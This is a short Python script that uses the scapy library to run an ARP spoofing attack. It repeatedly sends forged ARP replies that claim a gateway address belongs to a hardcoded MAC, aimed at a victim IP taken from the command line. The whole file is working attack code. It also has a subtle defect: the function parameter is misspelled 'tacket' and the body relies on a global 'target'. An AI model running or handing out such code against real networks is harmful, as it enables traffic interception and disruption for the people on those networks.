import time
import sys
from scapy.all import *


def ARPAttack(tacket, mac='78:45:c4:3b:b9:55', gateway='10.103.90.1'):
    request = 1
    victim = target
    mac = mac
    arp = ARP(op=request, psrc=gateway, pdst=victim, hwsrc=mac)
    while True:
        send(arp)
        time.sleep(.01)

if __name__ == "__main__":
    target = sys.argv[1]
    ARPAttack(target)
